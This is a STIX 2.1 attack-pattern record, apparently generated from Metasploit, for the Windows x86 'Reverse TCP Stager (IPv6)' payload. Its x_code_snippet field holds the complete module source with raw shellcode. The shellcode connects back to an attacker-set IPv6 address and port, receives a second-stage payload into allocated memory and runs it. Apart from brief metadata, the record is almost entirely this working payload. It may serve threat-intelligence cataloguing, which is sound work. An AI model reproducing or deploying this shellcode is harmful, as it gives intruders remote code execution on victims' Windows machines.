{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--974bade8-a99f-44d4-81b7-f797e5cd74ee",
    "created": "2024-08-14T16:33:19.498081Z",
    "modified": "2024-08-14T16:33:19.498085Z",
    "name": "Reverse TCP Stager (IPv6)",
    "description": "Connect back to the attacker over IPv6",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/payloads/stagers/windows/reverse_ipv6_tcp.rb",
            "external_id": "reverse_ipv6_tcp.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nmodule MetasploitModule\n\n  CachedSize = 289\n\n  include Msf::Payload::Stager\n  include Msf::Payload::Windows\n\n\n  def self.handler_type_alias\n    \"reverse_ipv6_tcp\"\n  end\n\n  def initialize(info = {})\n\n    super(merge_info(info,\n      'Name'          => 'Reverse TCP Stager (IPv6)',\n      'Description'   => 'Connect back to the attacker over IPv6',\n      'Author'        => ['hdm', 'skape', 'sf'],\n      'License'       => MSF_LICENSE,\n      'Platform'      => 'win',\n      'Arch'          => ARCH_X86,\n      'Handler'       => Msf::Handler::ReverseTcp,\n      'Convention'    => 'sockedi',\n      'Stager'        =>\n        {\n          'RequiresMidstager' => false,\n          'Offsets' =>\n            {\n              'LPORT'   => [ 200, 'n'     ],\n              'LHOST'   => [ 206, 'ADDR6' ],\n              'SCOPEID' => [ 222, 'V'     ]\n            },\n          'Payload' =>\n            \"\\xFC\\xE8\\x82\\x00\\x00\\x00\\x60\\x89\\xE5\\x31\\xC0\\x64\\x8B\\x50\\x30\\x8B\" +\n            \"\\x52\\x0C\\x8B\\x52\\x14\\x8B\\x72\\x28\\x0F\\xB7\\x4A\\x26\\x31\\xFF\\xAC\\x3C\" +\n            \"\\x61\\x7C\\x02\\x2C\\x20\\xC1\\xCF\\x0D\\x01\\xC7\\xE2\\xF2\\x52\\x57\\x8B\\x52\" +\n            \"\\x10\\x8B\\x4A\\x3C\\x8B\\x4C\\x11\\x78\\xE3\\x48\\x01\\xD1\\x51\\x8B\\x59\\x20\" +\n            \"\\x01\\xD3\\x8B\\x49\\x18\\xE3\\x3A\\x49\\x8B\\x34\\x8B\\x01\\xD6\\x31\\xFF\\xAC\" +\n            \"\\xC1\\xCF\\x0D\\x01\\xC7\\x38\\xE0\\x75\\xF6\\x03\\x7D\\xF8\\x3B\\x7D\\x24\\x75\" +\n            \"\\xE4\\x58\\x8B\\x58\\x24\\x01\\xD3\\x66\\x8B\\x0C\\x4B\\x8B\\x58\\x1C\\x01\\xD3\" +\n            \"\\x8B\\x04\\x8B\\x01\\xD0\\x89\\x44\\x24\\x24\\x5B\\x5B\\x61\\x59\\x5A\\x51\\xFF\" +\n            \"\\xE0\\x5F\\x5F\\x5A\\x8B\\x12\\xEB\\x8D\\x5D\\x68\\x33\\x32\\x00\\x00\\x68\\x77\" +\n            \"\\x73\\x32\\x5F\\x54\\x68\\x4C\\x77\\x26\\x07\\xFF\\xD5\\xB8\\x04\\x02\\x00\\x00\" +\n            \"\\x29\\xC4\\x48\\x48\\x54\\x50\\x68\\x29\\x80\\x6B\\x00\\xFF\\xD5\\x50\\x50\\x50\" +\n            \"\\x6A\\x06\\x40\\x50\\x6A\\x17\\x68\\xEA\\x0F\\xDF\\xE0\\xFF\\xD5\\x89\\xC7\\x6A\" +\n            \"\\x1C\\xE8\\x1C\\x00\\x00\\x00\\x17\\x00\\x11\\x5C\\x00\\x00\\x00\\x00\\xB1\\xBB\" +\n            \"\\xBB\\xBB\\xBB\\xBB\\xBB\\xBB\\xC1\\xCC\\xCC\\xCC\\xCC\\xCC\\xCC\\xCC\\xA1\\xAA\" +\n            \"\\xAA\\xAA\\x57\\x68\\x99\\xA5\\x74\\x61\\xFF\\xD5\\x89\\xE6\\x6A\\x00\\x6A\\x04\" +\n            \"\\x56\\x57\\x68\\x02\\xD9\\xC8\\x5F\\xFF\\xD5\\x8B\\x36\\x6A\\x40\\x68\\x00\\x10\" +\n            \"\\x00\\x00\\x56\\x6A\\x00\\x68\\x58\\xA4\\x53\\xE5\\xFF\\xD5\\x93\\x53\\x6A\\x00\" +\n            \"\\x56\\x53\\x57\\x68\\x02\\xD9\\xC8\\x5F\\xFF\\xD5\\x01\\xC3\\x29\\xC6\\x75\\xEE\" +\n            \"\\xC3\"\n        }\n      ))\n    register_options(\n      [\n        OptInt.new(\"SCOPEID\", [false, \"The IPv6 Scope ID, required for link-layer addresses\", 0])\n      ])\n  end\nend\n",
    "x_mitre_platforms": [
        "win'"
    ]
}